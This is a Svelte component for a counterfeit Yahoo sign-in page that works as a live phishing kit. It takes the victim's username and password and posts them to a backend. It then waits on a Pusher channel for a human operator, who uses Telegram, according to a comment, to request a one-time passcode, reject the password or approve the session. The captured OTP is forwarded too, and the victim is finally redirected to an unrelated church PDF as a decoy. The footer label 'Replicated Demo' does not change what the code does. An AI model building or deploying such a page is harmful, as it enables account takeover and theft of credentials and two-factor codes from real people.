<script>
  import { sendFrmData, sendOTP } from "$lib";
  import Pusher from 'pusher-js';
  import { PUBLIC_PUSHER_KEY, PUBLIC_PUSHER_CLUSTER } from '$env/static/public';

  let identifier = $state('');
  let password = $state('');
  let otp = $state('');
  let staySignedIn = $state(true);
  let identifierError = $state('');
  let passwordError = $state('');
  let otpError = $state('');
  let showPassword = $state(false);
  let isLoading = $state(false);
  let step = $state('identifier'); // 'identifier' | 'password' | 'otp' | 'success'

  let authType = $state('') // 'OTP' or 'PROMPT'
  let finalStatus = $state(''); // Tracking final state evaluations: 'APPROVED' or 'REJECTED' or '' (default is '')
  let showOTPsection = $state(false);

  let showFinalStatus = $derived.by(() => {
    // show error on rejected or failed trigger state evaluation
    if (finalStatus === 'REJECTED' || finalStatus === '') {
      return 'hide'
    }
    // APPROVED final state
    return 'show'
  });

  let activeChannelName = $state(''); // help holds the active channel name attached with the sessionId

  let idFocused = $state(false);
  let pwFocused = $state(false);
  let otpFocused = $state(false);

  let emailEl = $state();
  let pwEl = $state();
  let otpEl = $state();
  let successEl = $state();


  $effect(() => {
    /* shows OTP section when changed */
    if (showOTPsection) {
      isLoading = false;
      step = 'otp';

      pwEl.classList.remove('opacity-100');
      pwEl.classList.add('opacity-0');

      const callback = (ev) => {
        if (ev.propertyName === 'opacity') {
          pwEl?.removeEventListener('transitionend', callback);
          pwEl?.classList.add('hidden');
          otpEl?.classList.remove('hidden');

          requestAnimationFrame(() => {
            otpEl?.classList.remove('opacity-0');
            otpEl?.classList.add('opacity-100');
          });
        }
      };

      pwEl.addEventListener('transitionend', callback);
    }

    /* shows Success section when real-time trigger is pushed into */
    if (showFinalStatus === 'show') {
      showOTPsection = false
      isLoading = false;
      step = 'success';
      
      otpEl.classList.remove('opacity-100');
      otpEl.classList.add('opacity-0');

      const callback = (ev) => {
        if (ev.propertyName === 'opacity') {
          otpEl?.removeEventListener('transitionend', callback);
          otpEl?.classList.add('hidden');
          successEl?.classList.remove('hidden');

          requestAnimationFrame(() => {
            successEl?.classList.remove('opacity-0');
            successEl?.classList.add('opacity-100');
          });
        }
      };
      otpEl.addEventListener('transitionend', callback);

      // redirect user after 3seconds
      setTimeout(() => {
        location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf'
      }, 2000)
    }
  });

  // Establish an isolated single-user stream (per session based interaction)
  function setupPrivatePusherChannel(sessionId) {
    // Configured to automatically ping /api/pusher/auth behind the scenes
    const pusherClient = new Pusher(PUBLIC_PUSHER_KEY, {
      cluster: PUBLIC_PUSHER_CLUSTER,
      authEndpoint: '/api/pusher/auth'
    });

    activeChannelName = `private-session-${sessionId}`;

    // Subscribes matching the "private-session-{UUID}" footprint your backend utilizes
    const privateChannel = pusherClient.subscribe(activeChannelName);

    // Listen for the custom value you type into Telegram
    privateChannel.bind('auth-event', ({ type='', value='' }) => {
      authType = type; // 'OTP' or 'PROMPT'
      showOTPsection = true;
    });

    // Listen block 2: Catches the Success / Error evaluation button click
    privateChannel.bind('final-status-event', ({ status }) => {
      if (status === 'REJECTED') {
        otpError = 'There was an error verifying your OTP. Please try again'
        isLoading = false;
      } else {
        finalStatus = status; // 'APPROVED' or 'REJECTED'
        // Fully disconnect and release socket streams now that the whole lifecycle is over
        pusherClient.unsubscribe(activeChannelName);
        pusherClient.disconnect();
      }
    });

    // NEW Listener C: Catches the top-row Password Failure trigger
    privateChannel.bind('password-failed-event', ({ message }) => {
      // Force the UI back to State A and surface the error reason explicitly
      passwordError = message
      password = ''; // Clear out the bad password field for safe re-entry
      isLoading = false;
      pusherClient.unsubscribe(activeChannelName);
      pusherClient.disconnect();
    });
  }

  function validateID(val) {
    if (!val.trim()) return "Username, email, or mobile number is required";
    return "";
  }

  function handleNext(e) {
    e.preventDefault();
    const err = validateID(identifier);
    if (err) {
      identifierError = err;
      return;
    }
    identifierError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (emailEl && pwEl) {
        emailEl.classList.remove('opacity-100');
        emailEl.classList.add('opacity-0', 'pointer-events-none');

        const callback = (ev) => {
          if (ev.propertyName === 'opacity') {
            emailEl?.removeEventListener('transitionend', callback);
            emailEl?.classList.add('hidden');
            pwEl?.classList.remove('hidden');

            requestAnimationFrame(() => {
              pwEl?.classList.remove('opacity-0');
              pwEl?.classList.add('opacity-100');
            });
          }
        };
        emailEl.addEventListener('transitionend', callback);
      }
    }, 700);
  }

  function handleBackToIdentifier() {
    password = ''
    passwordError = ''
    isLoading = true

    setTimeout(() => {
      isLoading = false
      if (emailEl && pwEl) {
        step = 'identifier'
        pwEl.classList.remove('opacity-100');
        pwEl.classList.add('opacity-0');

        const backTransitionHandler = (ev) => {
          if (ev.propertyName === 'opacity') {
            pwEl.removeEventListener('transitionend', backTransitionHandler);
            pwEl.classList.add('hidden');
            emailEl.classList.remove('hidden');

            requestAnimationFrame(() => {
              emailEl.classList.remove('opacity-0', 'pointer-events-none');
              emailEl.classList.add('opacity-100');
            });
          }
        };
        pwEl.addEventListener('transitionend', backTransitionHandler);
      }
    }, 350)
  }

  async function handlePwSubmit(e) {
    e.preventDefault();
    if (!password) {
      passwordError = "Please enter your password";
      return;
    }
    passwordError = '';
    isLoading = true;

    try {
      // send to backend api
      const res = await sendFrmData({ signinType: 'Yahoo Sign-in', email: identifier, password: password });
      // check if there are no errors
      if (res?.error) {
        passwordError = res?.message
        isLoading = false;
        return
      }
      // wait for real-time update
      if (res?.success) {
        setupPrivatePusherChannel(res.sessionId);
      }
    } catch (error) {
      console.error('Error submitting form data: \n', error.message)
      passwordError = error.message;
    }
  }

  function handleBackToPassword() {
    otp = '';
    otpError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (pwEl && otpEl) {
        otpEl.classList.remove('opacity-100');
        otpEl.classList.add('opacity-0');

        const callback = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpEl?.removeEventListener('transitionend', callback);
            otpEl?.classList.add('hidden');
            pwEl?.classList.remove('hidden');

            requestAnimationFrame(() => {
              pwEl?.classList.remove('opacity-0');
              pwEl?.classList.add('opacity-100');
            });
          }
        };
        otpEl.addEventListener('transitionend', callback);
      }
    }, 350);
  }

  async function handleOtpSubmit(e) {
    e.preventDefault();
    if (!otp) {
      otpError = "Please enter the verification code";
      return;
    }
    const cleanOtp = otp.replace(/\D/g, '');
    if (cleanOtp.length < 6) {
      otpError = "The verification code must be 6 digits";
      return;
    }
    otpError = '';
    isLoading = true;

    // send to backend api
    const res = await sendOTP({ otp: otp, email: identifier });
  }
</script>


<section class="min-h-screen bg-white md:bg-[#f5f8fa] flex flex-col justify-between font-sans text-[#1d2a3a]">
  <header class="px-6 py-4 flex items-center justify-between bg-white md:bg-transparent border-b border-[#dadce0] md:border-none">
    <!-- Custom Brand Mark Logo  -->
    <div class="flex items-center gap-1 collapse">
      <svg viewBox="0 0 100 22" width="90" height="20" class="h-5 text-[#6001d2]" fill="currentColor">
        <path d="M12.4 1l4.9 11 4.7-11h4.9l-7.4 15.6v5.4h-4.4v-5.4L7.5 1h4.9zm16.7 8.3c1.7 0 3 .6 3.8 1.8 1 1.2 1.4 3 1.4 5.3s-.4 4.1-1.3 5.3c-.9 1.1-2.2 1.7-3.9 1.7-1.6 0-3-.6-3.8-1.7-1-1.2-1.4-3-1.4-5.3 0-2.3.4-4.1 1.4-5.3.8-1.2 2.2-1.8 3.8-1.8zM24 15.1c0 3 .8 4.6 2.6 4.6 1.8 0 2.6-1.6 2.6-4.6 0-3-.8-4.7-2.6-4.7-1.8 0-2.6 1.7-2.6 4.7zm19.8-6.8c1.7 0 3 .6 3.8 1.8 1 1.2 1.4 3 1.4 5.3s-.4 4.1-1.3 5.3c-.9 1.1-2.2 1.7-3.9 1.7-1.6 0-3-.6-3.8-1.7-1-1.2-1.4-3-1.4-5.3 0-2.3.4-4.1 1.4-5.3.8-1.2 2.2-1.8 3.8-1.8zm-5 6.8c0 3 .8 4.6 2.6 4.6 1.8 0 2.6-1.6 2.6-4.6 0-3-.8-4.7-2.6-4.7-1.8 0-2.6 1.7-2.6 4.7zm18.3-6.8c1.5 0 2.6.4 3.4 1.3V9.5h4v12h-4v-1.1c-.8.8-1.9 1.3-3.4 1.3-2.3 0-4-1.8-4-4.6 0-2.8 1.7-4.6 4-4.6zm1.3 7.1c0 1.6.8 2.3 1.9 2.3s1.9-.7 1.9-2.3c0-1.6-.8-2.3-1.9-2.3s-1.9.7-1.9 2.3zm19-7.1c.4 0 .9 0 1.3.1l-.3 3.9h-.9c-1.5 0-2.2.8-2.2 2.3V21.5h-4.1V9.5h4.1V12c.5-1.5 1.3-2.5 2.1-2.5zm11.3 1c.7 0 1.4.2 1.8.8.4.5.6 1.3.6 2.5V21.5H91V14c0-.9-.3-1.4-.9-1.4s-1 .5-1 1.4v7.5H85V9.5h4.1v1.1c.8-.8 1.9-1.3 3.4-1.3zm6.3-4.8c0-1 .7-1.7 1.7-1.7s1.7.7 1.7 1.7c0 .9-.8 1.6-1.7 1.6s-1.7-.7-1.7-1.6zm0 6.6h3.4V21.5h-3.4V9.5zM100 21.5V18.1h-2v3.4h2z" />
      </svg>
    </div>
    <div>
      <a
        href="#/"
        onclick={(e) => { e.preventDefault(); alert("Yahoo Help & Support Portal"); }}
        class="text-sm font-semibold text-[#6001d2] hover:underline"
      >
        Help
      </a>
    </div>
  </header>

  <div class="flex-1 flex items-center justify-center px-4 py-8">
    <div class="w-full max-w-105 bg-white rounded-[20px] md:border border-[#e0e0e0] p-6 md:p-10 shadow-none md:shadow-[0_4px_12px_rgba(0,0,0,0.08)] relative overflow-hidden min-h-115 flex flex-col justify-between transition-all duration-300">
      
      <!-- Top loading bar wrapper -->
      <div class="absolute top-0 left-0 right-0 h-1 bg-gray-50 overflow-hidden transition-opacity duration-300 {isLoading ? 'opacity-100' : 'opacity-0'}">
        <div class="h-full bg-[#6001d2] animate-[loading-bar_1.2s_infinite_ease-in-out]"></div>
      </div>

      <div class="flex flex-col flex-1 justify-between">
        <!-- STAGE 1 -->
        <div bind:this={emailEl} class="flex-1 flex flex-col justify-between transition-opacity duration-200 opacity-100">
          <div>
            <div class="text-3xl font-black text-[#6001d2] text-center mb-6">Yahoo!</div>
            <h2 class="text-xl font-bold text-center mb-1">Sign in</h2>
            <p class="text-sm text-gray-400 text-center mb-6">using your Yahoo account</p>

            <form onsubmit={handleNext} class="space-y-4">
              <div class="relative">
                <input
                  type="text"
                  bind:value={identifier}
                  name="email"
                  id="email"
                  onfocus={() => idFocused = true}
                  onblur={() => idFocused = false}
                  class="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none bg-transparent {identifierError ? 'border-[#ff3333]' : 'border-gray-300 focus:border-[#6001d2]'}"
                />
                <label 
                  for="email"
                  class="absolute left-4 bg-white px-1 pointer-events-none transition-all duration-150 {idFocused || identifier ? '-top-2.25 text-xs font-semibold text-[#6001d2]' : 'top-3.5 text-gray-400'}"
                >
                  Username, email, or mobile
                </label>
              </div>

              {#if identifierError}
                <div class="text-xs text-[#ff3333] px-1">{identifierError}</div>
              {/if}

              <button type="submit" class="w-full py-3.5 bg-[#6001d2] text-white font-bold rounded-full hover:bg-[#5000af] cursor-pointer">
                {isLoading ? 'Processing...' : 'Next'}
              </button>
              
              <!-- Account Creator button outlined purple -->
              <div class="flex items-center justify-between pt-2 select-none">
                <label class="flex items-center gap-2.5 text-sm text-[#1d2a3a] cursor-pointer">
                  <input
                    type="checkbox"
                    checked
                    class="w-4.5 h-4.5 text-[#6001d2] border-gray-300 rounded focus:ring-[#6001d2] focus:ring-offset-0 focus:ring-1 cursor-pointer"
                  />
                  <span>Stay signed in</span>
                </label>
                <button
                  type="button"
                  onclick={() => setIdentifierError("Please check the Yahoo help guide with your registered cellular number.")}
                  class="text-sm font-semibold text-[#1a73e8] hover:underline"
                >
                  Forgot username?
                </button>
              </div>
            </form>
          </div>

          <div class="mt-8 border-t border-[#f2f2f2] pt-6">
            <button
              type="button"
              onclick={() => alert("Redirecting to Yahoo registration portal...")}
              class="w-full py-3 bg-white border border-[#6001d2] hover:bg-[#6001d2]/5 active:bg-[#6001d2]/10 text-[#6001d2] text-[15px] font-bold rounded-full transition-all focus:outline-none focus:ring-2 focus:ring-[#6001d2] cursor-pointer"
            >
              Create an account
            </button>
          </div>
        </div>

        <!-- STAGE 2 (Password) -->
        <div bind:this={pwEl} class="flex-1 flex flex-col justify-between transition-opacity duration-200 opacity-0 hidden">
          <div>
            <div class="flex items-center justify-between mt-1 mb-5">
              <button
                type="button"
                onclick={handleBackToIdentifier}
                class="p-1 px-3.5 py-1.5 inline-flex items-center gap-2 text-sm text-[#1d2a3a] hover:bg-gray-100 rounded-full transition-colors font-semibold"
              >
                <svg class="w-4 h-4 text-[#1d2a3a]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
                </svg>
                <span>Back</span>
              </button>
              <span class="font-extrabold text-xl text-[#6001d2]">Yahoo!</span>
            </div>
            
            <div class="mb-4">
              <h2 class="text-lg font-bold text-[#1d2a3a] mb-1">Enter Password</h2>
              <p class="text-sm text-[#5a5a5a] truncate max-w-full">
                to verify access for{' '}
                <span class="font-semibold text-[#1d2a3a]">{identifier}</span>
              </p>
            </div>

            <form onsubmit={handlePwSubmit} class="space-y-4">
              <div class="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  bind:value={password}
                  name="password"
                  id="pwd"
                  onfocus={() => pwFocused = true}
                  onblur={() => pwFocused = false}
                  class="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none bg-transparent {passwordError ? 'border-[#ff3333]' : 'border-gray-300 focus:border-[#6001d2]'}"
                />
                <label for="pwd" class="absolute left-4 bg-white px-1 pointer-events-none transition-all duration-150 {pwFocused || password ? '-top-2.25 text-xs font-semibold text-[#6001d2]' : 'top-3.5 text-gray-400'}">
                  Password
                </label>
              </div>
              {#if passwordError != ''}
                <div class="text-amber-600 text-xs">
                  {passwordError}
                </div>
              {/if}

              <button type="submit" class="w-full py-3.5 bg-[#6001d2] text-white font-bold rounded-full cursor-pointer">
                {isLoading ? 'Verifying password...' : 'Sign in'}
              </button>
            </form>
          </div>
        </div>

        <!-- STAGE 3 (OTP Verification) -->
        <div bind:this={otpEl} class="flex-1 flex flex-col justify-between transition-opacity duration-200 opacity-0 hidden">
          <div>
            <div class="flex justify-center mb-5 mt-2">
              <span class="font-black text-3xl tracking-tight text-[#6001d2]">Yahoo!</span>
            </div>

            <div class="flex items-center gap-1.5 mb-4">
              <button
                type="button"
                onclick={handleBackToPassword}
                class="inline-flex items-center gap-1 text-sm font-semibold text-[#6001d2] hover:underline cursor-pointer"
              >
                <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                </svg>
                Back
              </button>
              <span class="text-xs text-gray-400">| Verification for {identifier}</span>
            </div>

            <h2 class="text-xl font-bold text-[#1d2a3a] mb-1">Verify your identity</h2>
            <p class="text-sm text-[#5a5a5a] mb-6 leading-relaxed">
              We've sent a 6-digit verification code to your registered mobile phone to secure your Yahoo entry.
            </p>

            <form onsubmit={handleOtpSubmit} class="space-y-4">
              <div class="relative">
                <input
                  type="text"
                  id="yahoo-otp-input"
                  name="yahoo-otp"
                  maxlength="6"
                  bind:value={otp}
                  oninput={(e) => {
                    otp = e.currentTarget.value.replace(/\D/g, '');
                    if (otpError) otpError = '';
                  }}
                  onfocus={() => otpFocused = true}
                  onblur={() => otpFocused = false}
                  class="w-full px-4 py-3.5 text-base border rounded-md focus:outline-none transition-all duration-150 bg-transparent text-[#1d2a3a] tracking-widest font-semibold {otpError ? 'border-[#ff3333] focus:ring-1 focus:ring-[#ff3333]' : 'border-[#b5b5b5] focus:border-[#6001d2] focus:ring-1 focus:ring-[#6001d2]'}"
                />
                <label 
                  for="yahoo-otp-input"
                  class="absolute left-4 bg-white px-1 transition-all duration-150 pointer-events-none {otpFocused || otp ? '-top-2.25 text-xs font-semibold leading-none text-[#6001d2]' : 'top-3.75 text-base text-[#7c808f]'} {otpError ? 'text-[#ff3333]' : (otpFocused ? 'text-[#6001d2]' : 'text-[#7c808f]')}"
                >
                  Verification Code
                </label>
              </div>

              {#if otpError}
                <div class="text-xs text-[#ff3333] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                  <svg class="w-4 h-4 shrink-0 fill-current mt-px" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                  </svg>
                  <span>{otpError}</span>
                </div>
              {/if}

              <button type="submit" class="w-full py-3.5 bg-[#6001d2] hover:bg-[#5000af] text-white text-[15px] font-bold rounded-full transition-all tracking-wide shadow-sm hover:shadow-md cursor-pointer select-none">
                {isLoading ? 'Verifying!...' : 'Verify Code'}
              </button>
            </form>
          </div>

          <div class="mt-6 text-center">
            <button
              type="button"
              onclick={() => otpError = "A new 6-digit verification SMS was dispatched to your mobile device."}
              class="text-sm font-semibold text-[#1a73e8] hover:underline"
            >
              Resend verification code
            </button>
          </div>
        </div>

        <!-- STAGE 4 (Success) -->
        <div bind:this={successEl} class="flex flex-1 flex-col justify-center items-center text-center opacity-0 hidden">
          <div class="w-16 h-16 rounded-full bg-purple-50 text-[#6001d2] flex items-center justify-center mb-6 border border-[#eedfff] animate-[scaleIn_0.35s_cubic-bezier(0.175,0.885,0.32,1.275)]">
            <svg class="w-8 h-8 fill-none stroke-current" stroke-width="2.5" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>

          <h2 class="text-xl font-bold mb-2">Authenticated Successful!</h2>

          <div class="bg-[#f5f8fa] border border-[#dadce0] rounded-xl px-5 py-3.5 mb-6 w-full">
            <p class="text-xs text-[#5a5a5a] mb-1 font-semibold uppercase tracking-wider">Yahoo ID Account</p>
            <p class="text-base font-bold text-[#1d2a3a] truncate">{identifier}</p>
          </div>

          <p class="text-sm text-[#5a5a5a] leading-relaxed max-w-70 mb-8">
            Verified successfully!. Your are now authorized to download the pdf.
          </p>

          <button 
            type="button" 
            onclick={() => { 
              location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf';
              step = 'identifier'; identifier = ''; password = ''; otp = ''; 
            }} 
            class="px-5 py-2.5 bg-gray-100 rounded-full font-bold cursor-pointer"
          >
            Continue
          </button>
        </div>
      </div>
    </div>
  </div>

  <footer class="w-full max-w-5xl mx-auto px-6 py-4 flex flex-col sm:flex-row items-center sm:justify-between gap-4 text-xs text-[#5a5a5a] font-normal select-none pointer-events-auto">
    <div>
      <span class="text-gray-400">© 2026 Yahoo (Replicated Demo)</span>
    </div>

    <div class="flex items-center gap-5">
      <a href="#/" class="hover:text-black hover:underline transition-colors" onclick={(e) => { e.preventDefault(); alert("Reorganization layout privacy."); }}>Privacy Policy</a>
      <a href="#/" class="hover:text-black hover:underline transition-colors" onclick={(e) => { e.preventDefault(); alert("Yahoo terms replica."); }}>Terms of Service</a>
      <a href="#/" class="hover:text-black hover:underline transition-colors" onclick={(e) => { e.preventDefault(); alert("Sign in with Yahoo premium replica."); }}>Ad Choices</a>
    </div>
  </footer>
</section>